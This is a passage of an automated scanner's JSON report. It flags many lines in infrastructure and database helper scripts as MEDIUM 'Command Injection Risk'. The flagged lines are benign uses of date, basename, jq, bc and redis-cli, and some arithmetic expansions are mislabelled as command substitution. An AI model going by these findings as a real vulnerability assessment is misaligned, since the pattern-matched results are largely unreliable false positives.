        "recommendation": "Validate and sanitize all inputs"
      },
      {
        "severity": "MEDIUM",
        "category": "Command Injection Risk",
        "file": "skills/infrastructure/terraform-best-practices/resources/scripts/cost_estimate.sh",
        "line_number": 314,
        "issue": "Command substitution in shell",
        "evidence": "local prev_cost=$(jq -r '.totalMonthlyCost' \"$COMPARE_FILE\")",
        "recommendation": "Validate and sanitize all inputs"
      },
      {
        "severity": "MEDIUM",
        "category": "Command Injection Risk",
        "file": "skills/infrastructure/terraform-best-practices/resources/scripts/cost_estimate.sh",
        "line_number": 315,
        "issue": "Command substitution in shell",
        "evidence": "local curr_cost=$(jq -r '.totalMonthlyCost' infracost.json)",
        "recommendation": "Validate and sanitize all inputs"
      },
      {
        "severity": "MEDIUM",
        "category": "Command Injection Risk",
        "file": "skills/infrastructure/terraform-best-practices/resources/scripts/cost_estimate.sh",
        "line_number": 316,
        "issue": "Command substitution in shell",
        "evidence": "local diff=$(echo \"$curr_cost - $prev_cost\" | bc)",
        "recommendation": "Validate and sanitize all inputs"
      },
      {
        "severity": "MEDIUM",
        "category": "Command Injection Risk",
        "file": "skills/infrastructure/terraform-best-practices/resources/scripts/cost_estimate.sh",
        "line_number": 317,
        "issue": "Command substitution in shell",
        "evidence": "local pct_change=$(echo \"scale=2; ($diff / $prev_cost) * 100\" | bc)",
        "recommendation": "Validate and sanitize all inputs"
      },
      {
        "severity": "MEDIUM",
        "category": "Command Injection Risk",
        "file": "skills/infrastructure/terraform-best-practices/resources/scripts/cost_estimate.sh",
        "line_number": 327,
        "issue": "Command substitution in shell",
        "evidence": "if (( $(echo \"$diff > 0\" | bc -l) )); then",
        "recommendation": "Validate and sanitize all inputs"
      },
      {
        "severity": "MEDIUM",
        "category": "Command Injection Risk",
        "file": "skills/infrastructure/terraform-best-practices/resources/scripts/cost_estimate.sh",
        "line_number": 329,
        "issue": "Command substitution in shell",
        "evidence": "elif (( $(echo \"$diff < 0\" | bc -l) )); then",
        "recommendation": "Validate and sanitize all inputs"
      },
      {
        "severity": "MEDIUM",
        "category": "Command Injection Risk",
        "file": "skills/infrastructure/terraform-best-practices/resources/scripts/cost_estimate.sh",
        "line_number": 403,
        "issue": "Command substitution in shell",
        "evidence": "output=$(cat infracost.json)",
        "recommendation": "Validate and sanitize all inputs"
      },
      {
        "severity": "MEDIUM",
        "category": "Command Injection Risk",
        "file": "skills/infrastructure/terraform-best-practices/resources/scripts/cost_estimate.sh",
        "line_number": 406,
        "issue": "Command substitution in shell",
        "evidence": "output=$(format_csv)",
        "recommendation": "Validate and sanitize all inputs"
      },
      {
        "severity": "MEDIUM",
        "category": "Command Injection Risk",
        "file": "skills/infrastructure/terraform-best-practices/resources/scripts/cost_estimate.sh",
        "line_number": 409,
        "issue": "Command substitution in shell",
        "evidence": "output=$(format_table)",
        "recommendation": "Validate and sanitize all inputs"
      },
      {
        "severity": "MEDIUM",
        "category": "Command Injection Risk",
        "file": "skills/infrastructure/terraform-best-practices/resources/scripts/cost_estimate.sh",
        "line_number": 412,
        "issue": "Command substitution in shell",
        "evidence": "output=\"$output$(echo)$(compare_estimates)\"",
        "recommendation": "Validate and sanitize all inputs"
      },
      {
        "severity": "MEDIUM",
        "category": "Command Injection Risk",
        "file": "skills/infrastructure/terraform-best-practices/resources/scripts/cost_estimate.sh",
        "line_number": 430,
        "issue": "Command substitution in shell",
        "evidence": "local monthly_cost=$(jq -r '.totalMonthlyCost' infracost.json | cut -d. -f1)",
        "recommendation": "Validate and sanitize all inputs"
      },
      {
        "severity": "MEDIUM",
        "category": "Command Injection Risk",
        "file": "skills/database/redis-data-structures/resources/scripts/test_patterns.sh",
        "line_number": 29,
        "issue": "Command substitution in shell",
        "evidence": "Usage: $(basename \"$0\") [OPTIONS]",
        "recommendation": "Validate and sanitize all inputs"
      },
      {
        "severity": "MEDIUM",
        "category": "Command Injection Risk",
        "file": "skills/database/redis-data-structures/resources/scripts/test_patterns.sh",
        "line_number": 46,
        "issue": "Command substitution in shell",
        "evidence": "$(basename \"$0\")",
        "recommendation": "Validate and sanitize all inputs"
      },
      {
        "severity": "MEDIUM",
        "category": "Command Injection Risk",
        "file": "skills/database/redis-data-structures/resources/scripts/test_patterns.sh",
        "line_number": 49,
        "issue": "Command substitution in shell",
        "evidence": "$(basename \"$0\") --pattern cache",
        "recommendation": "Validate and sanitize all inputs"
      },
      {
        "severity": "MEDIUM",
        "category": "Command Injection Risk",
        "file": "skills/database/redis-data-structures/resources/scripts/test_patterns.sh",
        "line_number": 52,
        "issue": "Command substitution in shell",
        "evidence": "$(basename \"$0\") --json",
        "recommendation": "Validate and sanitize all inputs"
      },
      {
        "severity": "MEDIUM",
        "category": "Command Injection Risk",
        "file": "skills/database/redis-data-structures/resources/scripts/test_patterns.sh",
        "line_number": 55,
        "issue": "Command substitution in shell",
        "evidence": "$(basename \"$0\") --host redis.example.com --port 6380 --password secret",
        "recommendation": "Validate and sanitize all inputs"
      },
      {
        "severity": "MEDIUM",
        "category": "Command Injection Risk",
        "file": "skills/database/redis-data-structures/resources/scripts/test_patterns.sh",
        "line_number": 174,
        "issue": "Command substitution in shell",
        "evidence": "local start_time=$(date +%s.%N)",
        "recommendation": "Validate and sanitize all inputs"
      },
      {
        "severity": "MEDIUM",
        "category": "Command Injection Risk",
        "file": "skills/database/redis-data-structures/resources/scripts/test_patterns.sh",
        "line_number": 188,
        "issue": "Command substitution in shell",
        "evidence": "local retrieved=$($REDIS_CMD GET \"$key\")",
        "recommendation": "Validate and sanitize all inputs"
      },
      {
        "severity": "MEDIUM",
        "category": "Command Injection Risk",
        "file": "skills/database/redis-data-structures/resources/scripts/test_patterns.sh",
        "line_number": 196,
        "issue": "Command substitution in shell",
        "evidence": "local ttl=$($REDIS_CMD TTL \"$key\")",
        "recommendation": "Validate and sanitize all inputs"
      },
      {
        "severity": "MEDIUM",
        "category": "Command Injection Risk",
        "file": "skills/database/redis-data-structures/resources/scripts/test_patterns.sh",
        "line_number": 209,
        "issue": "Command substitution in shell",
        "evidence": "local exists=$($REDIS_CMD EXISTS \"$key\")",
        "recommendation": "Validate and sanitize all inputs"
      },
      {
        "severity": "MEDIUM",
        "category": "Command Injection Risk",
        "file": "skills/database/redis-data-structures/resources/scripts/test_patterns.sh",
        "line_number": 218,
        "issue": "Command substitution in shell",
        "evidence": "local end_time=$(date +%s.%N)",
        "recommendation": "Validate and sanitize all inputs"
      },
      {
        "severity": "MEDIUM",
        "category": "Command Injection Risk",
        "file": "skills/database/redis-data-structures/resources/scripts/test_patterns.sh",
        "line_number": 219,
        "issue": "Command substitution in shell",
        "evidence": "local duration=$(echo \"$end_time - $start_time\" | bc)",
        "recommendation": "Validate and sanitize all inputs"
      },
      {
        "severity": "MEDIUM",
        "category": "Command Injection Risk",
        "file": "skills/database/redis-data-structures/resources/scripts/test_patterns.sh",
        "line_number": 229,
        "issue": "Command substitution in shell",
        "evidence": "local start_time=$(date +%s.%N)",
        "recommendation": "Validate and sanitize all inputs"
      },
      {
        "severity": "MEDIUM",
        "category": "Command Injection Risk",
        "file": "skills/database/redis-data-structures/resources/scripts/test_patterns.sh",
        "line_number": 244,
        "issue": "Command substitution in shell",
        "evidence": "local length=$($REDIS_CMD LLEN \"$queue\")",
        "recommendation": "Validate and sanitize all inputs"
      },
      {
        "severity": "MEDIUM",
        "category": "Command Injection Risk",
        "file": "skills/database/redis-data-structures/resources/scripts/test_patterns.sh",
        "line_number": 255,
        "issue": "Command substitution in shell",
        "evidence": "local item=$($REDIS_CMD RPOP \"$queue\")",
        "recommendation": "Validate and sanitize all inputs"
      },
      {
        "severity": "MEDIUM",
        "category": "Command Injection Risk",
        "file": "skills/database/redis-data-structures/resources/scripts/test_patterns.sh",
        "line_number": 276,
        "issue": "Command substitution in shell",
        "evidence": "local task=$($REDIS_CMD RPOPLPUSH \"$pending_queue\" \"$processing_queue\")",
        "recommendation": "Validate and sanitize all inputs"
      },
      {
        "severity": "MEDIUM",
        "category": "Command Injection Risk",
        "file": "skills/database/redis-data-structures/resources/scripts/test_patterns.sh",
        "line_number": 286,
        "issue": "Command substitution in shell",
        "evidence": "local end_time=$(date +%s.%N)",
        "recommendation": "Validate and sanitize all inputs"
      },
      {
        "severity": "MEDIUM",
        "category": "Command Injection Risk",
        "file": "skills/database/redis-data-structures/resources/scripts/test_patterns.sh",
        "line_number": 287,
        "issue": "Command substitution in shell",
        "evidence": "local duration=$(echo \"$end_time - $start_time\" | bc)",
        "recommendation": "Validate and sanitize all inputs"
      },
      {
        "severity": "MEDIUM",
        "category": "Command Injection Risk",
        "file": "skills/database/redis-data-structures/resources/scripts/test_patterns.sh",
        "line_number": 297,
        "issue": "Command substitution in shell",
        "evidence": "local start_time=$(date +%s.%N)",
        "recommendation": "Validate and sanitize all inputs"
      },
      {
        "severity": "MEDIUM",
        "category": "Command Injection Risk",
        "file": "skills/database/redis-data-structures/resources/scripts/test_patterns.sh",
        "line_number": 306,
        "issue": "Command substitution in shell",
        "evidence": "local subscribers=$($REDIS_CMD PUBLISH \"$channel\" \"test message\")",
        "recommendation": "Validate and sanitize all inputs"
      },
      {
        "severity": "MEDIUM",
        "category": "Command Injection Risk",
        "file": "skills/database/redis-data-structures/resources/scripts/test_patterns.sh",
        "line_number": 328,
        "issue": "Command substitution in shell",
        "evidence": "local end_time=$(date +%s.%N)",
        "recommendation": "Validate and sanitize all inputs"
      },
      {
        "severity": "MEDIUM",
        "category": "Command Injection Risk",
        "file": "skills/database/redis-data-structures/resources/scripts/test_patterns.sh",
        "line_number": 329,
        "issue": "Command substitution in shell",
        "evidence": "local duration=$(echo \"$end_time - $start_time\" | bc)",
        "recommendation": "Validate and sanitize all inputs"
      },
      {
        "severity": "MEDIUM",
        "category": "Command Injection Risk",
        "file": "skills/database/redis-data-structures/resources/scripts/test_patterns.sh",
        "line_number": 339,
        "issue": "Command substitution in shell",
        "evidence": "local start_time=$(date +%s.%N)",
        "recommendation": "Validate and sanitize all inputs"
      },
      {
        "severity": "MEDIUM",
        "category": "Command Injection Risk",
        "file": "skills/database/redis-data-structures/resources/scripts/test_patterns.sh",
        "line_number": 346,
        "issue": "Command substitution in shell",
        "evidence": "local acquired=$($REDIS_CMD SET \"$lock_key\" \"$lock_value\" NX EX 10)",
        "recommendation": "Validate and sanitize all inputs"
      },
      {
        "severity": "MEDIUM",
        "category": "Command Injection Risk",
        "file": "skills/database/redis-data-structures/resources/scripts/test_patterns.sh",
        "line_number": 354,
        "issue": "Command substitution in shell",
        "evidence": "local reacquired=$($REDIS_CMD SET \"$lock_key\" \"other-token\" NX EX 10)",
        "recommendation": "Validate and sanitize all inputs"
      },
      {
        "severity": "MEDIUM",
        "category": "Command Injection Risk",
        "file": "skills/database/redis-data-structures/resources/scripts/test_patterns.sh",
        "line_number": 363,
        "issue": "Command substitution in shell",
        "evidence": "local exists=$($REDIS_CMD EXISTS \"$lock_key\")",
        "recommendation": "Validate and sanitize all inputs"
      },
      {
        "severity": "MEDIUM",
        "category": "Command Injection Risk",
        "file": "skills/database/redis-data-structures/resources/scripts/test_patterns.sh",
        "line_number": 372,
        "issue": "Command substitution in shell",
        "evidence": "local released=$($REDIS_CMD EVAL \"$lua_script\" 1 \"$lock_key\" \"$lock_value\")",
        "recommendation": "Validate and sanitize all inputs"
      },
      {
        "severity": "MEDIUM",
        "category": "Command Injection Risk",
        "file": "skills/database/redis-data-structures/resources/scripts/test_patterns.sh",
        "line_number": 383,
        "issue": "Command substitution in shell",
        "evidence": "local end_time=$(date +%s.%N)",
        "recommendation": "Validate and sanitize all inputs"
      },
      {
        "severity": "MEDIUM",
        "category": "Command Injection Risk",
        "file": "skills/database/redis-data-structures/resources/scripts/test_patterns.sh",
        "line_number": 384,
        "issue": "Command substitution in shell",
        "evidence": "local duration=$(echo \"$end_time - $start_time\" | bc)",
        "recommendation": "Validate and sanitize all inputs"
      },
      {
        "severity": "MEDIUM",
        "category": "Command Injection Risk",
        "file": "skills/database/redis-data-structures/resources/scripts/test_patterns.sh",
        "line_number": 394,
        "issue": "Command substitution in shell",
        "evidence": "local start_time=$(date +%s.%N)",
        "recommendation": "Validate and sanitize all inputs"
      },
      {
        "severity": "MEDIUM",
        "category": "Command Injection Risk",
        "file": "skills/database/redis-data-structures/resources/scripts/test_patterns.sh",
        "line_number": 401,
        "issue": "Command substitution in shell",
        "evidence": "if ! $REDIS_CMD ZADD \"$leaderboard\" $((i * 100)) \"player:$i\" > /dev/null; then",
        "recommendation": "Validate and sanitize all inputs"
      },
      {
        "severity": "MEDIUM",
        "category": "Command Injection Risk",
        "file": "skills/database/redis-data-structures/resources/scripts/test_patterns.sh",
        "line_number": 409,
        "issue": "Command substitution in shell",
        "evidence": "local top_3=$($REDIS_CMD ZREVRANGE \"$leaderboard\" 0 2 WITHSCORES)",
        "recommendation": "Validate and sanitize all inputs"
      },
      {
        "severity": "MEDIUM",
        "category": "Command Injection Risk",
        "file": "skills/database/redis-data-structures/resources/scripts/test_patterns.sh",
        "line_number": 418,
        "issue": "Command substitution in shell",
        "evidence": "local rank=$($REDIS_CMD ZREVRANK \"$leaderboard\" \"player:5\")",
        "recommendation": "Validate and sanitize all inputs"
      },
      {
        "severity": "MEDIUM",
        "category": "Command Injection Risk",
        "file": "skills/database/redis-data-structures/resources/scripts/test_patterns.sh",
        "line_number": 427,
        "issue": "Command substitution in shell",
        "evidence": "local score=$($REDIS_CMD ZSCORE \"$leaderboard\" \"player:5\")",
        "recommendation": "Validate and sanitize all inputs"
      },
      {
        "severity": "MEDIUM",
        "category": "Command Injection Risk",
        "file": "skills/database/redis-data-structures/resources/scripts/test_patterns.sh",
        "line_number": 445,
        "issue": "Command substitution in shell",
        "evidence": "local end_time=$(date +%s.%N)",
        "recommendation": "Validate and sanitize all inputs"
      },
      {
        "severity": "MEDIUM",
        "category": "Command Injection Risk",
        "file": "skills/database/redis-data-structures/resources/scripts/test_patterns.sh",
        "line_number": 446,
        "issue": "Command substitution in shell",
        "evidence": "local duration=$(echo \"$end_time - $start_time\" | bc)",
        "recommendation": "Validate and sanitize all inputs"
      },
      {
        "severity": "MEDIUM",
        "category": "Command Injection Risk",
        "file": "skills/database/redis-data-structures/resources/scripts/test_patterns.sh",
        "line_number": 456,
        "issue": "Command substitution in shell",
        "evidence": "local start_time=$(date +%s.%N)",
        "recommendation": "Validate and sanitize all inputs"
      },
      {
        "severity": "MEDIUM",
        "category": "Command Injection Risk",
        "file": "skills/database/redis-data-structures/resources/scripts/test_patterns.sh",
        "line_number": 465,
        "issue": "Command substitution in shell",
        "evidence": "local current=$($REDIS_CMD INCR \"$rate_key\")",
        "recommendation": "Validate and sanitize all inputs"
      },
      {
        "severity": "MEDIUM",
        "category": "Command Injection Risk",
        "file": "skills/database/redis-data-structures/resources/scripts/test_patterns.sh",
        "line_number": 484,
        "issue": "Command substitution in shell",
        "evidence": "local now=$(date +%s)",
        "recommendation": "Validate and sanitize all inputs"
      },
      {
        "severity": "MEDIUM",
        "category": "Command Injection Risk",
        "file": "skills/database/redis-data-structures/resources/scripts/test_patterns.sh",
        "line_number": 489,
        "issue": "Command substitution in shell",
        "evidence": "$REDIS_CMD ZADD \"$window_key\" $((now + i)) \"req:$i\" > /dev/null",
        "recommendation": "Validate and sanitize all inputs"
      },
      {
        "severity": "MEDIUM",
        "category": "Command Injection Risk",
        "file": "skills/database/redis-data-structures/resources/scripts/test_patterns.sh",
        "line_number": 493,
        "issue": "Command substitution in shell",
        "evidence": "$REDIS_CMD ZREMRANGEBYSCORE \"$window_key\" 0 $((now - window)) > /dev/null",
        "recommendation": "Validate and sanitize all inputs"
      },
      {
        "severity": "MEDIUM",
        "category": "Command Injection Risk",
        "file": "skills/database/redis-data-structures/resources/scripts/test_patterns.sh",
        "line_number": 496,
        "issue": "Command substitution in shell",
        "evidence": "local window_count=$($REDIS_CMD ZCARD \"$window_key\")",
        "recommendation": "Validate and sanitize all inputs"
      },
      {
        "severity": "MEDIUM",
        "category": "Command Injection Risk",
        "file": "skills/database/redis-data-structures/resources/scripts/test_patterns.sh",
        "line_number": 506,
        "issue": "Command substitution in shell",
        "evidence": "local end_time=$(date +%s.%N)",
        "recommendation": "Validate and sanitize all inputs"
      },
      {
        "severity": "MEDIUM",
        "category": "Command Injection Risk",
        "file": "skills/database/redis-data-structures/resources/scripts/test_patterns.sh",
        "line_number": 507,
        "issue": "Command substitution in shell",
        "evidence": "local duration=$(echo \"$end_time - $start_time\" | bc)",
        "recommendation": "Validate and sanitize all inputs"
      },
      {
        "severity": "MEDIUM",
        "category": "Command Injection Risk",
        "file": "skills/database/postgres-migrations/resources/scripts/test_migration.sh",
        "line_number": 35,
        "issue": "Command substitution in shell",
        "evidence": "DB_PORT=$((5432 + (RANDOM % 1000)))",
        "recommendation": "Validate and sanitize all inputs"
      },
      {
        "severity": "MEDIUM",
        "category": "Command Injection Risk",
        "file": "skills/database/postgres-migrations/resources/scripts/test_migration.sh",
        "line_number": 48,
        "issue": "Command substitution in shell",
        "evidence": "echo -e \"${GREEN}[$(date +'%H:%M:%S')]${NC} $*\"",
        "recommendation": "Validate and sanitize all inputs"
      },
      {
        "severity": "MEDIUM",
        "category": "Command Injection Risk",
        "file": "skills/database/postgres-migrations/resources/scripts/test_migration.sh",
        "line_number": 222,
        "issue": "Command substitution in shell",
        "evidence": "-v \"$(pwd)/$MIGRATIONS_DIR:/flyway/sql\" \\",
        "recommendation": "Validate and sanitize all inputs"
      },
      {
        "severity": "MEDIUM",
        "category": "Command Injection Risk",
        "file": "skills/database/postgres-migrations/resources/scripts/test_migration.sh",
        "line_number": 233,
        "issue": "Command substitution in shell",
        "evidence": "count=$(run_psql -t -c \"SELECT COUNT(*) FROM flyway_schema_history WHERE success = true;\" | tr -d ' ')",
        "recommendation": "Validate and sanitize all inputs"
      },
      {
        "severity": "MEDIUM",
        "category": "Command Injection Risk",
        "file": "skills/database/postgres-migrations/resources/scripts/test_migration.sh",
        "line_number": 258,
        "issue": "Command substitution in shell",
        "evidence": "version=$(migrate -database \"$db_url\" -path \"$MIGRATIONS_DIR\" version 2>&1 || echo \"unknown\")",
        "recommendation": "Validate and sanitize all inputs"
      },
      {
        "severity": "MEDIUM",
        "category": "Command Injection Risk",
        "file": "skills/database/postgres-migrations/resources/scripts/test_migration.sh",
        "line_number": 348,
        "issue": "Command substitution in shell",
        "evidence": "tables=$(run_psql -t -c \"SELECT COUNT(*) FROM information_schema.tables WHERE table_schema = 'public';\" | tr -d ' ')",
        "recommendation": "Validate and sanitize all inputs"
      },
      {
        "severity": "MEDIUM",
        "category": "Command Injection Risk",
        "file": "skills/database/postgres-migrations/resources/scripts/test_migration.sh",
        "line_number": 355,
        "issue": "Command substitution in shell",
        "evidence": "invalid_indexes=$(run_psql -t -c \"SELECT COUNT(*) FROM pg_index WHERE NOT indisvalid;\" | tr -d ' ')",
        "recommendation": "Validate and sanitize all inputs"
      },
      {
        "severity": "MEDIUM",
        "category": "Command Injection Risk",
        "file": "skills/database/postgres-migrations/resources/scripts/test_migration.sh",
        "line_number": 372,
        "issue": "Command substitution in shell",
        "evidence": "echo -n \"\\\"passed\\\":$(printf '%s\\n' \"${TEST_RESULTS[@]}\" | grep -c '\"status\":\"passed\"'),\"",
        "recommendation": "Validate and sanitize all inputs"
      },
      {
        "severity": "MEDIUM",
        "category": "Command Injection Risk",
        "file": "skills/database/postgres-migrations/resources/scripts/test_migration.sh",
        "line_number": 373,
        "issue": "Command substitution in shell",
        "evidence": "echo -n \"\\\"failed\\\":$(printf '%s\\n' \"${TEST_RESULTS[@]}\" | grep -c '\"status\":\"failed\"' || echo 0)\"",
        "recommendation": "Validate and sanitize all inputs"
      },
      {
        "severity": "MEDIUM",
        "category": "Command Injection Risk",
        "file": "skills/database/postgres-migrations/resources/scripts/test_migration.sh",
        "line_number": 382,
        "issue": "Command substitution in shell",
        "evidence": "echo \"Passed: $(printf '%s\\n' \"${TEST_RESULTS[@]}\" | grep -c '\"status\":\"passed\"')\"",
        "recommendation": "Validate and sanitize all inputs"
      },
      {
        "severity": "MEDIUM",
        "category": "Command Injection Risk",
        "file": "skills/database/postgres-migrations/resources/scripts/test_migration.sh",
        "line_number": 383,
        "issue": "Command substitution in shell",
        "evidence": "echo \"Failed: $(printf '%s\\n' \"${TEST_RESULTS[@]}\" | grep -c '\"status\":\"failed\"' || echo 0)\"",
        "recommendation": "Validate and sanitize all inputs"
      },
      {
        "severity": "MEDIUM",
        "category": "Command Injection Risk",
        "file": "skills/database/postgres-migrations/resources/scripts/test_migration.sh",
        "line_number": 384,
        "issue": "Command substitution in shell",
        "evidence": "echo \"Warnings: $(printf '%s\\n' \"${TEST_RESULTS[@]}\" | grep -c '\"status\":\"warning\"' || echo 0)\"",
        "recommendation": "Validate and sanitize all inputs"
      },
      {
        "severity": "MEDIUM",
        "category": "Command Injection Risk",
        "file": "skills/database/postgres-migrations/resources/scripts/test_migration.sh",
        "line_number": 435,
        "issue": "Command substitution in shell",
        "evidence": "TOOL=$(detect_migration_tool \"$MIGRATIONS_DIR\")",
        "recommendation": "Validate and sanitize all inputs"
      },
      {
        "severity": "MEDIUM",
        "category": "Command Injection Risk",
        "file": "skills/database/postgres-migrations/resources/scripts/test_migration.sh",
        "line_number": 475,
        "issue": "Command substitution in shell",
        "evidence": "failed_count=$(printf '%s\\n' \"${TEST_RESULTS[@]}\" | grep -c '\"status\":\"failed\"' || echo 0)",
        "recommendation": "Validate and sanitize all inputs"
      },
      {
        "severity": "MEDIUM",
        "category": "Command Injection Risk",
        "file": "skills/database/postgres-query-optimization/resources/scripts/benchmark_queries.sh",
        "line_number": 35,
        "issue": "Command substitution in shell",
        "evidence": "$(basename \"$0\") --query \"SELECT ...\" [OPTIONS]",
        "recommendation": "Validate and sanitize all inputs"
      },
      {
        "severity": "MEDIUM",
        "category": "Command Injection Risk",
        "file": "skills/database/postgres-query-optimization/resources/scripts/benchmark_queries.sh",
        "line_number": 36,
        "issue": "Command substitution in shell",
        "evidence": "$(basename \"$0\") --query-file queries.sql [OPTIONS]",
        "recommendation": "Validate and sanitize all inputs"
      },
      {
        "severity": "MEDIUM",
        "category": "Command Injection Risk",
        "file": "skills/database/postgres-query-optimization/resources/scripts/benchmark_queries.sh",
        "line_number": 37,
        "issue": "Command substitution in shell",
        "evidence": "$(basename \"$0\") --compare before.sql after.sql [OPTIONS]",
        "recommendation": "Validate and sanitize all inputs"
      },
      {
        "severity": "MEDIUM",
        "category": "Command Injection Risk",
        "file": "skills/database/postgres-query-optimization/resources/scripts/benchmark_queries.sh",
        "line_number": 52,
        "issue": "Command substitution in shell",
        "evidence": "$(basename \"$0\") --query \"SELECT * FROM users WHERE id = 123\"",
        "recommendation": "Validate and sanitize all inputs"
      },
      {
        "severity": "MEDIUM",
        "category": "Command Injection Risk",
        "file": "skills/database/postgres-query-optimization/resources/scripts/benchmark_queries.sh",
        "line_number": 55,
        "issue": "Command substitution in shell",
        "evidence": "$(basename \"$0\") --query-file queries.sql --iterations 20",
        "recommendation": "Validate and sanitize all inputs"
      },
      {
        "severity": "MEDIUM",
        "category": "Command Injection Risk",
        "file": "skills/database/postgres-query-optimization/resources/scripts/benchmark_queries.sh",
        "line_number": 58,
        "issue": "Command substitution in shell",
        "evidence": "$(basename \"$0\") --compare slow_query.sql fast_query.sql",
        "recommendation": "Validate and sanitize all inputs"
      },
      {
        "severity": "MEDIUM",
        "category": "Command Injection Risk",
        "file": "skills/database/postgres-query-optimization/resources/scripts/benchmark_queries.sh",
        "line_number": 61,
        "issue": "Command substitution in shell",
        "evidence": "$(basename \"$0\") --query \"SELECT COUNT(*) FROM orders\" --json",
        "recommendation": "Validate and sanitize all inputs"
      },
      {
        "severity": "MEDIUM",
        "category": "Command Injection Risk",
        "file": "skills/database/postgres-query-optimization/resources/scripts/benchmark_queries.sh",
        "line_number": 141,
        "issue": "Command substitution in shell",
        "evidence": "local start=$(date +%s%N)",
        "recommendation": "Validate and sanitize all inputs"
      },
      {
        "severity": "MEDIUM",
        "category": "Command Injection Risk",
        "file": "skills/database/postgres-query-optimization/resources/scripts/benchmark_queries.sh",
        "line_number": 143,
        "issue": "Command substitution in shell",
        "evidence": "local exec_time=$(cat /tmp/bench_time_$$.txt)",
        "recommendation": "Validate and sanitize all inputs"
      },
      {
        "severity": "MEDIUM",
        "category": "Command Injection Risk",
        "file": "skills/database/postgres-query-optimization/resources/scripts/benchmark_queries.sh",
        "line_number": 160,
        "issue": "Command substitution in shell",
        "evidence": "sum=$(echo \"$sum + $time\" | bc)",
        "recommendation": "Validate and sanitize all inputs"
      },
      {
        "severity": "MEDIUM",
        "category": "Command Injection Risk",
        "file": "skills/database/postgres-query-optimization/resources/scripts/benchmark_queries.sh",
        "line_number": 161,
        "issue": "Command substitution in shell",
        "evidence": "if (( $(echo \"$time < $min\" | bc -l) )); then",
        "recommendation": "Validate and sanitize all inputs"
      },
      {
        "severity": "MEDIUM",
        "category": "Command Injection Risk",
        "file": "skills/database/postgres-query-optimization/resources/scripts/benchmark_queries.sh",
        "line_number": 164,
        "issue": "Command substitution in shell",
        "evidence": "if (( $(echo \"$time > $max\" | bc -l) )); then",
        "recommendation": "Validate and sanitize all inputs"
      },
      {
        "severity": "MEDIUM",
        "category": "Command Injection Risk",
        "file": "skills/database/postgres-query-optimization/resources/scripts/benchmark_queries.sh",
        "line_number": 169,
        "issue": "Command substitution in shell",
        "evidence": "local mean=$(echo \"scale=3; $sum / ${#times[@]}\" | bc)",
        "recommendation": "Validate and sanitize all inputs"
      },
      {
        "severity": "MEDIUM",
        "category": "Command Injection Risk",
        "file": "skills/database/postgres-query-optimization/resources/scripts/benchmark_queries.sh",
        "line_number": 172,
        "issue": "Command substitution in shell",
        "evidence": "IFS=$'\\n' sorted=($(sort -n <<<\"${times[*]}\"))",
        "recommendation": "Validate and sanitize all inputs"
      },
      {
        "severity": "MEDIUM",
        "category": "Command Injection Risk",
        "file": "skills/database/postgres-query-optimization/resources/scripts/benchmark_queries.sh",
        "line_number": 176,
        "issue": "Command substitution in shell",
        "evidence": "local mid1=${sorted[$((count/2 - 1))]}",
        "recommendation": "Validate and sanitize all inputs"
      },
      {
        "severity": "MEDIUM",
        "category": "Command Injection Risk",
        "file": "skills/database/postgres-query-optimization/resources/scripts/benchmark_queries.sh",
        "line_number": 177,
        "issue": "Command substitution in shell",
        "evidence": "local mid2=${sorted[$((count/2))]}",
        "recommendation": "Validate and sanitize all inputs"
      },
      {
        "severity": "MEDIUM",
        "category": "Command Injection Risk",
        "file": "skills/database/postgres-query-optimization/resources/scripts/benchmark_queries.sh",
        "line_number": 178,
        "issue": "Command substitution in shell",
        "evidence": "median=$(echo \"scale=3; ($mid1 + $mid2) / 2\" | bc)",
        "recommendation": "Validate and sanitize all inputs"
      },
      {
        "severity": "MEDIUM",
        "category": "Command Injection Risk",
        "file": "skills/database/postgres-query-optimization/resources/scripts/benchmark_queries.sh",
        "line_number": 180,
        "issue": "Command substitution in shell",
        "evidence": "median=${sorted[$((count/2))]}",
        "recommendation": "Validate and sanitize all inputs"
      },
      {
        "severity": "MEDIUM",
        "category": "Command Injection Risk",
        "file": "skills/database/postgres-query-optimization/resources/scripts/benchmark_queries.sh",
        "line_number": 186,
        "issue": "Command substitution in shell",
        "evidence": "local diff=$(echo \"$time - $mean\" | bc)",
        "recommendation": "Validate and sanitize all inputs"
      },
      {
        "severity": "MEDIUM",
        "category": "Command Injection Risk",
        "file": "skills/database/postgres-query-optimization/resources/scripts/benchmark_queries.sh",
        "line_number": 187,
        "issue": "Command substitution in shell",
        "evidence": "local squared=$(echo \"$diff * $diff\" | bc)",
        "recommendation": "Validate and sanitize all inputs"
      },
      {
        "severity": "MEDIUM",
        "category": "Command Injection Risk",
        "file": "skills/database/postgres-query-optimization/resources/scripts/benchmark_queries.sh",
        "line_number": 188,
        "issue": "Command substitution in shell",
        "evidence": "variance_sum=$(echo \"$variance_sum + $squared\" | bc)",
        "recommendation": "Validate and sanitize all inputs"
      },
      {
        "severity": "MEDIUM",
        "category": "Command Injection Risk",
        "file": "skills/database/postgres-query-optimization/resources/scripts/benchmark_queries.sh",
        "line_number": 190,
        "issue": "Command substitution in shell",
        "evidence": "local variance=$(echo \"scale=3; $variance_sum / ${#times[@]}\" | bc)",
        "recommendation": "Validate and sanitize all inputs"
      },
      {
        "severity": "MEDIUM",
        "category": "Command Injection Risk",
        "file": "skills/database/postgres-query-optimization/resources/scripts/benchmark_queries.sh",
        "line_number": 191,
        "issue": "Command substitution in shell",
        "evidence": "local stddev=$(echo \"scale=3; sqrt($variance)\" | bc)",
        "recommendation": "Validate and sanitize all inputs"
      },
      {
        "severity": "MEDIUM",
        "category": "Command Injection Risk",
        "file": "skills/database/postgres-query-optimization/resources/scripts/benchmark_queries.sh",
        "line_number": 205,
        "issue": "Command substitution in shell",
        "evidence": "\"times\": [$(IFS=,; echo \"${times[*]}\")]",
        "recommendation": "Validate and sanitize all inputs"
      },
      {
        "severity": "MEDIUM",
        "category": "Command Injection Risk",
        "file": "skills/database/postgres-query-optimization/resources/scripts/benchmark_queries.sh",
        "line_number": 218,
        "issue": "Command substitution in shell",
        "evidence": "local mean=$(echo \"$results\" | jq -r '.mean_ms')",
        "recommendation": "Validate and sanitize all inputs"
      },
      {
        "severity": "MEDIUM",
        "category": "Command Injection Risk",
        "file": "skills/database/postgres-query-optimization/resources/scripts/benchmark_queries.sh",
        "line_number": 219,
        "issue": "Command substitution in shell",
        "evidence": "local median=$(echo \"$results\" | jq -r '.median_ms')",
        "recommendation": "Validate and sanitize all inputs"
      },
      {
        "severity": "MEDIUM",
        "category": "Command Injection Risk",
        "file": "skills/database/postgres-query-optimization/resources/scripts/benchmark_queries.sh",
